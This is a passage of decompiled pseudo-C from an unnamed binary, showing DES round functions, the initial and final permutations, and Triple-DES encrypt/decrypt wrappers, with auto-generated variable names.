  LOBYTE(v79) = BYTE1(v80);
  v77 >>= 16;
  v82 = *(_DWORD *)(a2 + v78 + 256) ^ v81;
  LOBYTE(v78) = BYTE1(v77);
  v80 >>= 16;
  v83 = *(_DWORD *)(a2 + v79 + 768) ^ v82;
  LOBYTE(v79) = BYTE1(v80);
  v84 = *(_DWORD *)(a2 + (unsigned __int8)v80 + 1280) ^ *(_DWORD *)(a2 + (unsigned __int8)v77 + 1024) ^ *(_DWORD *)(a2 + v79 + 1792) ^ *(_DWORD *)(a2 + v78 + 1536) ^ v83;
  v85 = (v84 ^ a1[20]) & 0xFCFCFCFC;
  v86 = (unsigned __int8)v85;
  v87 = BYTE1(v85);
  v88 = __ROR4__((v84 ^ a1[21]) & 0xCFCFCFCF, 4);
  LOBYTE(v86) = v88;
  v89 = *(_DWORD *)(a2 + BYTE1(v85) + 512) ^ *(_DWORD *)(a2 + (unsigned __int8)v85) ^ v76;
  LOBYTE(v87) = BYTE1(v88);
  v85 >>= 16;
  v90 = *(_DWORD *)(a2 + v86 + 256) ^ v89;
  LOBYTE(v86) = BYTE1(v85);
  v88 >>= 16;
  v91 = *(_DWORD *)(a2 + v87 + 768) ^ v90;
  LOBYTE(v87) = BYTE1(v88);
  v92 = *(_DWORD *)(a2 + (unsigned __int8)v88 + 1280) ^ *(_DWORD *)(a2 + (unsigned __int8)v85 + 1024) ^ *(_DWORD *)(a2 + v87 + 1792) ^ *(_DWORD *)(a2 + v86 + 1536) ^ v91;
  v93 = (v92 ^ a1[22]) & 0xFCFCFCFC;
  v94 = (unsigned __int8)v93;
  v95 = BYTE1(v93);
  v96 = __ROR4__((v92 ^ a1[23]) & 0xCFCFCFCF, 4);
  LOBYTE(v94) = v96;
  v97 = *(_DWORD *)(a2 + BYTE1(v93) + 512) ^ *(_DWORD *)(a2 + (unsigned __int8)v93) ^ v84;
  LOBYTE(v95) = BYTE1(v96);
  v93 >>= 16;
  v98 = *(_DWORD *)(a2 + v94 + 256) ^ v97;
  LOBYTE(v94) = BYTE1(v93);
  v96 >>= 16;
  v99 = *(_DWORD *)(a2 + v95 + 768) ^ v98;
  LOBYTE(v95) = BYTE1(v96);
  v100 = *(_DWORD *)(a2 + (unsigned __int8)v96 + 1280) ^ *(_DWORD *)(a2 + (unsigned __int8)v93 + 1024) ^ *(_DWORD *)(a2 + v95 + 1792) ^ *(_DWORD *)(a2 + v94 + 1536) ^ v99;
  v101 = (v100 ^ a1[24]) & 0xFCFCFCFC;
  v102 = (unsigned __int8)v101;
  v103 = BYTE1(v101);
  v104 = __ROR4__((v100 ^ a1[25]) & 0xCFCFCFCF, 4);
  LOBYTE(v102) = v104;
  v105 = *(_DWORD *)(a2 + BYTE1(v101) + 512) ^ *(_DWORD *)(a2 + (unsigned __int8)v101) ^ v92;
  LOBYTE(v103) = BYTE1(v104);
  v101 >>= 16;
  v106 = *(_DWORD *)(a2 + v102 + 256) ^ v105;
  LOBYTE(v102) = BYTE1(v101);
  v104 >>= 16;
  v107 = *(_DWORD *)(a2 + v103 + 768) ^ v106;
  LOBYTE(v103) = BYTE1(v104);
  v108 = *(_DWORD *)(a2 + (unsigned __int8)v104 + 1280) ^ *(_DWORD *)(a2 + (unsigned __int8)v101 + 1024) ^ *(_DWORD *)(a2 + v103 + 1792) ^ *(_DWORD *)(a2 + v102 + 1536) ^ v107;
  v109 = (v108 ^ a1[26]) & 0xFCFCFCFC;
  v110 = (unsigned __int8)v109;
  v111 = BYTE1(v109);
  v112 = __ROR4__((v108 ^ a1[27]) & 0xCFCFCFCF, 4);
  LOBYTE(v110) = v112;
  v113 = *(_DWORD *)(a2 + BYTE1(v109) + 512) ^ *(_DWORD *)(a2 + (unsigned __int8)v109) ^ v100;
  LOBYTE(v111) = BYTE1(v112);
  v109 >>= 16;
  v114 = *(_DWORD *)(a2 + v110 + 256) ^ v113;
  LOBYTE(v110) = BYTE1(v109);
  v112 >>= 16;
  v115 = *(_DWORD *)(a2 + v111 + 768) ^ v114;
  LOBYTE(v111) = BYTE1(v112);
  v116 = *(_DWORD *)(a2 + (unsigned __int8)v112 + 1280) ^ *(_DWORD *)(a2 + (unsigned __int8)v109 + 1024) ^ *(_DWORD *)(a2 + v111 + 1792) ^ *(_DWORD *)(a2 + v110 + 1536) ^ v115;
  v117 = (v116 ^ a1[28]) & 0xFCFCFCFC;
  v118 = (unsigned __int8)v117;
  v119 = BYTE1(v117);
  v120 = __ROR4__((v116 ^ a1[29]) & 0xCFCFCFCF, 4);
  LOBYTE(v118) = v120;
  v121 = *(_DWORD *)(a2 + BYTE1(v117) + 512) ^ *(_DWORD *)(a2 + (unsigned __int8)v117) ^ v108;
  LOBYTE(v119) = BYTE1(v120);
  v117 >>= 16;
  v122 = *(_DWORD *)(a2 + v118 + 256) ^ v121;
  LOBYTE(v118) = BYTE1(v117);
  v120 >>= 16;
  v123 = *(_DWORD *)(a2 + v119 + 768) ^ v122;
  LOBYTE(v119) = BYTE1(v120);
  return (unsigned __int8)(((*(_DWORD *)(a2 + (unsigned __int8)v120 + 1280) ^ *(_DWORD *)(a2
                                                                                        + (unsigned __int8)v117
                                                                                        + 1024) ^ *(_DWORD *)(a2 + v119 + 1792) ^ *(_DWORD *)(a2 + v118 + 1536) ^ v123 ^ a1[30]) & 0xFCFCFCFC) >> 16);
}

//----- (004B8B20) --------------------------------------------------------
int __usercall sub_4B8B20@<eax>(_DWORD *a1@<ecx>, int a2@<ebp>, int a3@<edi>, int a4@<esi>)
{
  unsigned int v4; // eax
  unsigned int v5; // edx
  int v6; // ebx
  int v7; // ecx
  unsigned int v8; // edx
  int v9; // edi
  int v10; // edi
  int v11; // edi
  int v12; // edi
  unsigned int v13; // eax
  int v14; // ebx
  int v15; // ecx
  unsigned int v16; // edx
  int v17; // esi
  int v18; // esi
  int v19; // esi
  int v20; // esi
  unsigned int v21; // eax
  int v22; // ebx
  int v23; // ecx
  unsigned int v24; // edx
  int v25; // edi
  int v26; // edi
  int v27; // edi
  int v28; // edi
  unsigned int v29; // eax
  int v30; // ebx
  int v31; // ecx
  unsigned int v32; // edx
  int v33; // esi
  int v34; // esi
  int v35; // esi
  int v36; // esi
  unsigned int v37; // eax
  int v38; // ebx
  int v39; // ecx
  unsigned int v40; // edx
  int v41; // edi
  int v42; // edi
  int v43; // edi
  int v44; // edi
  unsigned int v45; // eax
  int v46; // ebx
  int v47; // ecx
  unsigned int v48; // edx
  int v49; // esi
  int v50; // esi
  int v51; // esi
  int v52; // esi
  unsigned int v53; // eax
  int v54; // ebx
  int v55; // ecx
  unsigned int v56; // edx
  int v57; // edi
  int v58; // edi
  int v59; // edi
  int v60; // edi
  unsigned int v61; // eax
  int v62; // ebx
  int v63; // ecx
  unsigned int v64; // edx
  int v65; // esi
  int v66; // esi
  int v67; // esi
  int v68; // esi
  unsigned int v69; // eax
  int v70; // ebx
  int v71; // ecx
  unsigned int v72; // edx
  int v73; // edi
  int v74; // edi
  int v75; // edi
  int v76; // edi
  unsigned int v77; // eax
  int v78; // ebx
  int v79; // ecx
  unsigned int v80; // edx
  int v81; // esi
  int v82; // esi
  int v83; // esi
  int v84; // esi
  unsigned int v85; // eax
  int v86; // ebx
  int v87; // ecx
  unsigned int v88; // edx
  int v89; // edi
  int v90; // edi
  int v91; // edi
  int v92; // edi
  unsigned int v93; // eax
  int v94; // ebx
  int v95; // ecx
  unsigned int v96; // edx
  int v97; // esi
  int v98; // esi
  int v99; // esi
  int v100; // esi
  unsigned int v101; // eax
  int v102; // ebx
  int v103; // ecx
  unsigned int v104; // edx
  int v105; // edi
  int v106; // edi
  int v107; // edi
  int v108; // edi
  unsigned int v109; // eax
  int v110; // ebx
  int v111; // ecx
  unsigned int v112; // edx
  int v113; // esi
  int v114; // esi
  int v115; // esi
  int v116; // esi
  unsigned int v117; // eax
  int v118; // ebx
  int v119; // ecx
  unsigned int v120; // edx
  int v121; // edi
  int v122; // edi
  int v123; // edi

  v4 = (a4 ^ a1[30]) & 0xFCFCFCFC;
  v5 = (a4 ^ a1[31]) & 0xCFCFCFCF;
  v6 = (unsigned __int8)v4;
  v7 = BYTE1(v4);
  v8 = __ROR4__(v5, 4);
  LOBYTE(v6) = v8;
  v9 = *(_DWORD *)(a2 + BYTE1(v4) + 512) ^ *(_DWORD *)(a2 + (unsigned __int8)v4) ^ a3;
  LOBYTE(v7) = BYTE1(v8);
  v4 >>= 16;
  v10 = *(_DWORD *)(a2 + v6 + 256) ^ v9;
  LOBYTE(v6) = BYTE1(v4);
  v8 >>= 16;
  v11 = *(_DWORD *)(a2 + v7 + 768) ^ v10;
  LOBYTE(v7) = BYTE1(v8);
  v12 = *(_DWORD *)(a2 + (unsigned __int8)v8 + 1280) ^ *(_DWORD *)(a2 + (unsigned __int8)v4 + 1024) ^ *(_DWORD *)(a2 + v7 + 1792) ^ *(_DWORD *)(a2 + v6 + 1536) ^ v11;
  v13 = (v12 ^ a1[28]) & 0xFCFCFCFC;
  v14 = (unsigned __int8)v13;
  v15 = BYTE1(v13);
  v16 = __ROR4__((v12 ^ a1[29]) & 0xCFCFCFCF, 4);
  LOBYTE(v14) = v16;
  v17 = *(_DWORD *)(a2 + BYTE1(v13) + 512) ^ *(_DWORD *)(a2 + (unsigned __int8)v13) ^ a4;
  LOBYTE(v15) = BYTE1(v16);
  v13 >>= 16;
  v18 = *(_DWORD *)(a2 + v14 + 256) ^ v17;
  LOBYTE(v14) = BYTE1(v13);
  v16 >>= 16;
  v19 = *(_DWORD *)(a2 + v15 + 768) ^ v18;
  LOBYTE(v15) = BYTE1(v16);
  v20 = *(_DWORD *)(a2 + (unsigned __int8)v16 + 1280) ^ *(_DWORD *)(a2 + (unsigned __int8)v13 + 1024) ^ *(_DWORD *)(a2 + v15 + 1792) ^ *(_DWORD *)(a2 + v14 + 1536) ^ v19;
  v21 = (v20 ^ a1[26]) & 0xFCFCFCFC;
  v22 = (unsigned __int8)v21;
  v23 = BYTE1(v21);
  v24 = __ROR4__((v20 ^ a1[27]) & 0xCFCFCFCF, 4);
  LOBYTE(v22) = v24;
  v25 = *(_DWORD *)(a2 + BYTE1(v21) + 512) ^ *(_DWORD *)(a2 + (unsigned __int8)v21) ^ v12;
  LOBYTE(v23) = BYTE1(v24);
  v21 >>= 16;
  v26 = *(_DWORD *)(a2 + v22 + 256) ^ v25;
  LOBYTE(v22) = BYTE1(v21);
  v24 >>= 16;
  v27 = *(_DWORD *)(a2 + v23 + 768) ^ v26;
  LOBYTE(v23) = BYTE1(v24);
  v28 = *(_DWORD *)(a2 + (unsigned __int8)v24 + 1280) ^ *(_DWORD *)(a2 + (unsigned __int8)v21 + 1024) ^ *(_DWORD *)(a2 + v23 + 1792) ^ *(_DWORD *)(a2 + v22 + 1536) ^ v27;
  v29 = (v28 ^ a1[24]) & 0xFCFCFCFC;
  v30 = (unsigned __int8)v29;
  v31 = BYTE1(v29);
  v32 = __ROR4__((v28 ^ a1[25]) & 0xCFCFCFCF, 4);
  LOBYTE(v30) = v32;
  v33 = *(_DWORD *)(a2 + BYTE1(v29) + 512) ^ *(_DWORD *)(a2 + (unsigned __int8)v29) ^ v20;
  LOBYTE(v31) = BYTE1(v32);
  v29 >>= 16;
  v34 = *(_DWORD *)(a2 + v30 + 256) ^ v33;
  LOBYTE(v30) = BYTE1(v29);
  v32 >>= 16;
  v35 = *(_DWORD *)(a2 + v31 + 768) ^ v34;
  LOBYTE(v31) = BYTE1(v32);
  v36 = *(_DWORD *)(a2 + (unsigned __int8)v32 + 1280) ^ *(_DWORD *)(a2 + (unsigned __int8)v29 + 1024) ^ *(_DWORD *)(a2 + v31 + 1792) ^ *(_DWORD *)(a2 + v30 + 1536) ^ v35;
  v37 = (v36 ^ a1[22]) & 0xFCFCFCFC;
  v38 = (unsigned __int8)v37;
  v39 = BYTE1(v37);
  v40 = __ROR4__((v36 ^ a1[23]) & 0xCFCFCFCF, 4);
  LOBYTE(v38) = v40;
  v41 = *(_DWORD *)(a2 + BYTE1(v37) + 512) ^ *(_DWORD *)(a2 + (unsigned __int8)v37) ^ v28;
  LOBYTE(v39) = BYTE1(v40);
  v37 >>= 16;
  v42 = *(_DWORD *)(a2 + v38 + 256) ^ v41;
  LOBYTE(v38) = BYTE1(v37);
  v40 >>= 16;
  v43 = *(_DWORD *)(a2 + v39 + 768) ^ v42;
  LOBYTE(v39) = BYTE1(v40);
  v44 = *(_DWORD *)(a2 + (unsigned __int8)v40 + 1280) ^ *(_DWORD *)(a2 + (unsigned __int8)v37 + 1024) ^ *(_DWORD *)(a2 + v39 + 1792) ^ *(_DWORD *)(a2 + v38 + 1536) ^ v43;
  v45 = (v44 ^ a1[20]) & 0xFCFCFCFC;
  v46 = (unsigned __int8)v45;
  v47 = BYTE1(v45);
  v48 = __ROR4__((v44 ^ a1[21]) & 0xCFCFCFCF, 4);
  LOBYTE(v46) = v48;
  v49 = *(_DWORD *)(a2 + BYTE1(v45) + 512) ^ *(_DWORD *)(a2 + (unsigned __int8)v45) ^ v36;
  LOBYTE(v47) = BYTE1(v48);
  v45 >>= 16;
  v50 = *(_DWORD *)(a2 + v46 + 256) ^ v49;
  LOBYTE(v46) = BYTE1(v45);
  v48 >>= 16;
  v51 = *(_DWORD *)(a2 + v47 + 768) ^ v50;
  LOBYTE(v47) = BYTE1(v48);
  v52 = *(_DWORD *)(a2 + (unsigned __int8)v48 + 1280) ^ *(_DWORD *)(a2 + (unsigned __int8)v45 + 1024) ^ *(_DWORD *)(a2 + v47 + 1792) ^ *(_DWORD *)(a2 + v46 + 1536) ^ v51;
  v53 = (v52 ^ a1[18]) & 0xFCFCFCFC;
  v54 = (unsigned __int8)v53;
  v55 = BYTE1(v53);
  v56 = __ROR4__((v52 ^ a1[19]) & 0xCFCFCFCF, 4);
  LOBYTE(v54) = v56;
  v57 = *(_DWORD *)(a2 + BYTE1(v53) + 512) ^ *(_DWORD *)(a2 + (unsigned __int8)v53) ^ v44;
  LOBYTE(v55) = BYTE1(v56);
  v53 >>= 16;
  v58 = *(_DWORD *)(a2 + v54 + 256) ^ v57;
  LOBYTE(v54) = BYTE1(v53);
  v56 >>= 16;
  v59 = *(_DWORD *)(a2 + v55 + 768) ^ v58;
  LOBYTE(v55) = BYTE1(v56);
  v60 = *(_DWORD *)(a2 + (unsigned __int8)v56 + 1280) ^ *(_DWORD *)(a2 + (unsigned __int8)v53 + 1024) ^ *(_DWORD *)(a2 + v55 + 1792) ^ *(_DWORD *)(a2 + v54 + 1536) ^ v59;
  v61 = (v60 ^ a1[16]) & 0xFCFCFCFC;
  v62 = (unsigned __int8)v61;
  v63 = BYTE1(v61);
  v64 = __ROR4__((v60 ^ a1[17]) & 0xCFCFCFCF, 4);
  LOBYTE(v62) = v64;
  v65 = *(_DWORD *)(a2 + BYTE1(v61) + 512) ^ *(_DWORD *)(a2 + (unsigned __int8)v61) ^ v52;
  LOBYTE(v63) = BYTE1(v64);
  v61 >>= 16;
  v66 = *(_DWORD *)(a2 + v62 + 256) ^ v65;
  LOBYTE(v62) = BYTE1(v61);
  v64 >>= 16;
  v67 = *(_DWORD *)(a2 + v63 + 768) ^ v66;
  LOBYTE(v63) = BYTE1(v64);
  v68 = *(_DWORD *)(a2 + (unsigned __int8)v64 + 1280) ^ *(_DWORD *)(a2 + (unsigned __int8)v61 + 1024) ^ *(_DWORD *)(a2 + v63 + 1792) ^ *(_DWORD *)(a2 + v62 + 1536) ^ v67;
  v69 = (v68 ^ a1[14]) & 0xFCFCFCFC;
  v70 = (unsigned __int8)v69;
  v71 = BYTE1(v69);
  v72 = __ROR4__((v68 ^ a1[15]) & 0xCFCFCFCF, 4);
  LOBYTE(v70) = v72;
  v73 = *(_DWORD *)(a2 + BYTE1(v69) + 512) ^ *(_DWORD *)(a2 + (unsigned __int8)v69) ^ v60;
  LOBYTE(v71) = BYTE1(v72);
  v69 >>= 16;
  v74 = *(_DWORD *)(a2 + v70 + 256) ^ v73;
  LOBYTE(v70) = BYTE1(v69);
  v72 >>= 16;
  v75 = *(_DWORD *)(a2 + v71 + 768) ^ v74;
  LOBYTE(v71) = BYTE1(v72);
  v76 = *(_DWORD *)(a2 + (unsigned __int8)v72 + 1280) ^ *(_DWORD *)(a2 + (unsigned __int8)v69 + 1024) ^ *(_DWORD *)(a2 + v71 + 1792) ^ *(_DWORD *)(a2 + v70 + 1536) ^ v75;
  v77 = (v76 ^ a1[12]) & 0xFCFCFCFC;
  v78 = (unsigned __int8)v77;
  v79 = BYTE1(v77);
  v80 = __ROR4__((v76 ^ a1[13]) & 0xCFCFCFCF, 4);
  LOBYTE(v78) = v80;
  v81 = *(_DWORD *)(a2 + BYTE1(v77) + 512) ^ *(_DWORD *)(a2 + (unsigned __int8)v77) ^ v68;
  LOBYTE(v79) = BYTE1(v80);
  v77 >>= 16;
  v82 = *(_DWORD *)(a2 + v78 + 256) ^ v81;
  LOBYTE(v78) = BYTE1(v77);
  v80 >>= 16;
  v83 = *(_DWORD *)(a2 + v79 + 768) ^ v82;
  LOBYTE(v79) = BYTE1(v80);
  v84 = *(_DWORD *)(a2 + (unsigned __int8)v80 + 1280) ^ *(_DWORD *)(a2 + (unsigned __int8)v77 + 1024) ^ *(_DWORD *)(a2 + v79 + 1792) ^ *(_DWORD *)(a2 + v78 + 1536) ^ v83;
  v85 = (v84 ^ a1[10]) & 0xFCFCFCFC;
  v86 = (unsigned __int8)v85;
  v87 = BYTE1(v85);
  v88 = __ROR4__((v84 ^ a1[11]) & 0xCFCFCFCF, 4);
  LOBYTE(v86) = v88;
  v89 = *(_DWORD *)(a2 + BYTE1(v85) + 512) ^ *(_DWORD *)(a2 + (unsigned __int8)v85) ^ v76;
  LOBYTE(v87) = BYTE1(v88);
  v85 >>= 16;
  v90 = *(_DWORD *)(a2 + v86 + 256) ^ v89;
  LOBYTE(v86) = BYTE1(v85);
  v88 >>= 16;
  v91 = *(_DWORD *)(a2 + v87 + 768) ^ v90;
  LOBYTE(v87) = BYTE1(v88);
  v92 = *(_DWORD *)(a2 + (unsigned __int8)v88 + 1280) ^ *(_DWORD *)(a2 + (unsigned __int8)v85 + 1024) ^ *(_DWORD *)(a2 + v87 + 1792) ^ *(_DWORD *)(a2 + v86 + 1536) ^ v91;
  v93 = (v92 ^ a1[8]) & 0xFCFCFCFC;
  v94 = (unsigned __int8)v93;
  v95 = BYTE1(v93);
  v96 = __ROR4__((v92 ^ a1[9]) & 0xCFCFCFCF, 4);
  LOBYTE(v94) = v96;
  v97 = *(_DWORD *)(a2 + BYTE1(v93) + 512) ^ *(_DWORD *)(a2 + (unsigned __int8)v93) ^ v84;
  LOBYTE(v95) = BYTE1(v96);
  v93 >>= 16;
  v98 = *(_DWORD *)(a2 + v94 + 256) ^ v97;
  LOBYTE(v94) = BYTE1(v93);
  v96 >>= 16;
  v99 = *(_DWORD *)(a2 + v95 + 768) ^ v98;
  LOBYTE(v95) = BYTE1(v96);
  v100 = *(_DWORD *)(a2 + (unsigned __int8)v96 + 1280) ^ *(_DWORD *)(a2 + (unsigned __int8)v93 + 1024) ^ *(_DWORD *)(a2 + v95 + 1792) ^ *(_DWORD *)(a2 + v94 + 1536) ^ v99;
  v101 = (v100 ^ a1[6]) & 0xFCFCFCFC;
  v102 = (unsigned __int8)v101;
  v103 = BYTE1(v101);
  v104 = __ROR4__((v100 ^ a1[7]) & 0xCFCFCFCF, 4);
  LOBYTE(v102) = v104;
  v105 = *(_DWORD *)(a2 + BYTE1(v101) + 512) ^ *(_DWORD *)(a2 + (unsigned __int8)v101) ^ v92;
  LOBYTE(v103) = BYTE1(v104);
  v101 >>= 16;
  v106 = *(_DWORD *)(a2 + v102 + 256) ^ v105;
  LOBYTE(v102) = BYTE1(v101);
  v104 >>= 16;
  v107 = *(_DWORD *)(a2 + v103 + 768) ^ v106;
  LOBYTE(v103) = BYTE1(v104);
  v108 = *(_DWORD *)(a2 + (unsigned __int8)v104 + 1280) ^ *(_DWORD *)(a2 + (unsigned __int8)v101 + 1024) ^ *(_DWORD *)(a2 + v103 + 1792) ^ *(_DWORD *)(a2 + v102 + 1536) ^ v107;
  v109 = (v108 ^ a1[4]) & 0xFCFCFCFC;
  v110 = (unsigned __int8)v109;
  v111 = BYTE1(v109);
  v112 = __ROR4__((v108 ^ a1[5]) & 0xCFCFCFCF, 4);
  LOBYTE(v110) = v112;
  v113 = *(_DWORD *)(a2 + BYTE1(v109) + 512) ^ *(_DWORD *)(a2 + (unsigned __int8)v109) ^ v100;
  LOBYTE(v111) = BYTE1(v112);
  v109 >>= 16;
  v114 = *(_DWORD *)(a2 + v110 + 256) ^ v113;
  LOBYTE(v110) = BYTE1(v109);
  v112 >>= 16;
  v115 = *(_DWORD *)(a2 + v111 + 768) ^ v114;
  LOBYTE(v111) = BYTE1(v112);
  v116 = *(_DWORD *)(a2 + (unsigned __int8)v112 + 1280) ^ *(_DWORD *)(a2 + (unsigned __int8)v109 + 1024) ^ *(_DWORD *)(a2 + v111 + 1792) ^ *(_DWORD *)(a2 + v110 + 1536) ^ v115;
  v117 = (v116 ^ a1[2]) & 0xFCFCFCFC;
  v118 = (unsigned __int8)v117;
  v119 = BYTE1(v117);
  v120 = __ROR4__((v116 ^ a1[3]) & 0xCFCFCFCF, 4);
  LOBYTE(v118) = v120;
  v121 = *(_DWORD *)(a2 + BYTE1(v117) + 512) ^ *(_DWORD *)(a2 + (unsigned __int8)v117) ^ v108;
  LOBYTE(v119) = BYTE1(v120);
  v117 >>= 16;
  v122 = *(_DWORD *)(a2 + v118 + 256) ^ v121;
  LOBYTE(v118) = BYTE1(v117);
  v120 >>= 16;
  v123 = *(_DWORD *)(a2 + v119 + 768) ^ v122;
  LOBYTE(v119) = BYTE1(v120);
  return (unsigned __int8)(((*(_DWORD *)(a2 + (unsigned __int8)v120 + 1280) ^ *(_DWORD *)(a2
                                                                                        + (unsigned __int8)v117
                                                                                        + 1024) ^ *(_DWORD *)(a2 + v119 + 1792) ^ *(_DWORD *)(a2 + v118 + 1536) ^ v123 ^ *a1) & 0xFCFCFCFC) >> 16);
}

//----- (004B9240) --------------------------------------------------------
int __cdecl sub_4B9240(_DWORD *a1, _DWORD *a2, int a3)
{
  int v3; // edi
  int v4; // esi
  unsigned int v5; // eax
  int v6; // esi
  int v7; // eax
  unsigned int v8; // edi
  int v9; // esi
  int v10; // edi
  int v11; // eax
  int v12; // edi
  int v13; // eax
  int v14; // esi
  int v15; // edi
  int v16; // esi
  unsigned int v17; // eax
  int v18; // esi
  int v19; // edi
  int v20; // esi
  int v21; // eax
  unsigned int v22; // edi
  int v23; // esi
  int v24; // edi
  int v25; // eax
  int v26; // esi
  int v27; // eax
  int v28; // edi
  int v29; // eax
  int v30; // edi
  unsigned int v31; // esi
  int v32; // eax
  int v33; // esi
  unsigned int v34; // edi
  int result; // eax

  v3 = a1[1];
  v4 = __ROL4__(*a1, 4);
  v5 = (v3 ^ v4) & 0xF0F0F0F0;
  v6 = v5 ^ v4;
  v7 = __ROL4__(v5 ^ v3, 20);
  v8 = (v6 ^ v7) & 0xFFF0000F;
  v9 = v8 ^ v6;
  v10 = __ROL4__(v8 ^ v7, 14);
  v11 = (v9 ^ v10) & 0x33333333;
  v12 = v11 ^ v10;
  v13 = __ROL4__(v11 ^ v9, 22);
  v14 = (v12 ^ v13) & 0x3FC03FC;
  v15 = v14 ^ v12;
  v16 = __ROL4__(v14 ^ v13, 9);
  v17 = (v15 ^ v16) & 0xAAAAAAAA;
  v18 = v17 ^ v16;
  v19 = __ROL4__(v17 ^ v15, 1);
  if ( a3 )
    sub_4B8400(a2, 4954624, v19, v18);
  else
    sub_4B8B20(a2, 4954624, v19, v18);
  v20 = __ROR4__(v18, 1);
  v21 = v19;
  v22 = (v20 ^ v19) & 0xAAAAAAAA;
  v23 = v22 ^ v20;
  v24 = __ROL4__(v22 ^ v21, 23);
  v25 = (v23 ^ v24) & 0x3FC03FC;
  v26 = v25 ^ v23;
  v27 = __ROL4__(v25 ^ v24, 10);
  v28 = (v26 ^ v27) & 0x33333333;
  v29 = v28 ^ v27;
  v30 = __ROL4__(v28 ^ v26, 18);
  v31 = (v29 ^ v30) & 0xFFF0000F;
  v32 = v31 ^ v29;
  v33 = __ROL4__(v31 ^ v30, 12);
  v34 = (v32 ^ v33) & 0xF0F0F0F0;
  result = __ROR4__(v34 ^ v32, 4);
  *a1 = result;
  a1[1] = v34 ^ v33;
  return result;
}

//----- (004B9340) --------------------------------------------------------
_DWORD *__cdecl sub_4B9340(_DWORD *a1, _DWORD *a2, int a3)
{
  int v3; // esi
  int v4; // edi
  _DWORD *result; // eax

  v3 = __ROL4__(*a1, 3);
  v4 = __ROL4__(a1[1], 3);
  if ( a3 )
    sub_4B8400(a2, 4954624, v4, v3);
  else
    sub_4B8B20(a2, 4954624, v4, v3);
  result = a1;
  *a1 = __ROR4__(v4, 3);
  a1[1] = __ROR4__(v3, 3);
  return result;
}

//----- (004B93A0) --------------------------------------------------------
int __cdecl sub_4B93A0(_DWORD *a1, _DWORD *a2, _DWORD *a3, _DWORD *a4)
{
  int v4; // esi
  int v5; // edx
  unsigned int v6; // edi
  int v7; // edx
  int v8; // edi
  unsigned int v9; // esi
  int v10; // edx
  int v11; // esi
  int v12; // edi
  int v13; // esi
  int v14; // edi
  int v15; // edx
  int v16; // esi
  int v17; // edx
  unsigned int v18; // edi
  int v19; // esi
  int v20; // eax
  unsigned int v21; // edi
  int v22; // esi
  int v23; // edi
  int v24; // eax
  int v25; // esi
  int v26; // eax
  int v27; // edi
  int v28; // eax
  int v29; // edi
  unsigned int v30; // esi
  int v31; // eax
  int v32; // esi
  unsigned int v33; // edi
  int result; // eax

  v4 = a1[1];
  v5 = __ROL4__(*a1, 4);
  v6 = (v4 ^ v5) & 0xF0F0F0F0;
  v7 = v6 ^ v5;
  v8 = __ROL4__(v6 ^ v4, 20);
  v9 = (v7 ^ v8) & 0xFFF0000F;
  v10 = v9 ^ v7;
  v11 = __ROL4__(v9 ^ v8, 14);
  v12 = (v10 ^ v11) & 0x33333333;
  v13 = v12 ^ v11;
  v14 = __ROL4__(v12 ^ v10, 22);
  v15 = (v13 ^ v14) & 0x3FC03FC;
  v16 = v15 ^ v13;
  v17 = __ROL4__(v15 ^ v14, 9);
  v18 = (v16 ^ v17) & 0xAAAAAAAA;
  a1[1] = __ROR4__(v18 ^ v16, 2);
  *a1 = __ROR4__(v18 ^ v17, 3);
  sub_4B9340(a1, a2, 1);
  sub_4B9340(a1, a3, 0);
  sub_4B9340(a1, a4, 1);
  v19 = __ROL4__(a1[1], 2);
  v20 = __ROL4__(*a1, 3);
  v21 = (v19 ^ v20) & 0xAAAAAAAA;
  v22 = v21 ^ v19;
  v23 = __ROL4__(v21 ^ v20, 23);
  v24 = (v22 ^ v23) & 0x3FC03FC;
  v25 = v24 ^ v22;
  v26 = __ROL4__(v24 ^ v23, 10);
  v27 = (v25 ^ v26) & 0x33333333;
  v28 = v27 ^ v26;
  v29 = __ROL4__(v27 ^ v25, 18);
  v30 = (v28 ^ v29) & 0xFFF0000F;
  v31 = v30 ^ v28;
  v32 = __ROL4__(v30 ^ v29, 12);
  v33 = (v31 ^ v32) & 0xF0F0F0F0;
  result = __ROR4__(v33 ^ v31, 4);
  *a1 = result;
  a1[1] = v33 ^ v32;
  return result;
}

//----- (004B94D0) --------------------------------------------------------
int __cdecl sub_4B94D0(_DWORD *a1, _DWORD *a2, _DWORD *a3, _DWORD *a4)
{
  int v4; // esi
  int v5; // edx
  unsigned int v6; // edi
  int v7; // edx
  int v8; // edi
  unsigned int v9; // esi
  int v10; // edx
  int v11; // esi
  int v12; // edi
  int v13; // esi
  int v14; // edi
  int v15; // edx
  int v16; // esi
  int v17; // edx
  unsigned int v18; // edi
  int v19; // esi
  int v20; // eax
  unsigned int v21; // edi
  int v22; // esi
  int v23; // edi
  int v24; // eax
  int v25; // esi
  int v26; // eax
  int v27; // edi
  int v28; // eax
  int v29; // edi
  unsigned int v30; // esi
  int v31; // eax
  int v32; // esi
  unsigned int v33; // edi
  int result; // eax

  v4 = a1[1];
  v5 = __ROL4__(*a1, 4);
  v6 = (v4 ^ v5) & 0xF0F0F0F0;
  v7 = v6 ^ v5;
  v8 = __ROL4__(v6 ^ v4, 20);
  v9 = (v7 ^ v8) & 0xFFF0000F;
  v10 = v9 ^ v7;
  v11 = __ROL4__(v9 ^ v8, 14);
  v12 = (v10 ^ v11) & 0x33333333;
  v13 = v12 ^ v11;
  v14 = __ROL4__(v12 ^ v10, 22);
  v15 = (v13 ^ v14) & 0x3FC03FC;
  v16 = v15 ^ v13;
  v17 = __ROL4__(v15 ^ v14, 9);
  v18 = (v16 ^ v17) & 0xAAAAAAAA;
  a1[1] = __ROR4__(v18 ^ v16, 2);
  *a1 = __ROR4__(v18 ^ v17, 3);
  sub_4B9340(a1, a4, 0);
  sub_4B9340(a1, a3, 1);
  sub_4B9340(a1, a2, 0);
  v19 = __ROL4__(a1[1], 2);
  v20 = __ROL4__(*a1, 3);
  v21 = (v19 ^ v20) & 0xAAAAAAAA;
  v22 = v21 ^ v19;
  v23 = __ROL4__(v21 ^ v20, 23);
  v24 = (v22 ^ v23) & 0x3FC03FC;
  v25 = v24 ^ v22;
  v26 = __ROL4__(v24 ^ v23, 10);
  v27 = (v25 ^ v26) & 0x33333333;
  v28 = v27 ^ v26;
  v29 = __ROL4__(v27 ^ v25, 18);
  v30 = (v28 ^ v29) & 0xFFF0000F;
  v31 = v30 ^ v28;
  v32 = __ROL4__(v30 ^ v29, 12);
  v33 = (v31 ^ v32) & 0xF0F0F0F0;
  result = __ROR4__(v33 ^ v31, 4);
  *a1 = result;
  a1[1] = v33 ^ v32;
  return result;
}

//----- (004B9600) --------------------------------------------------------
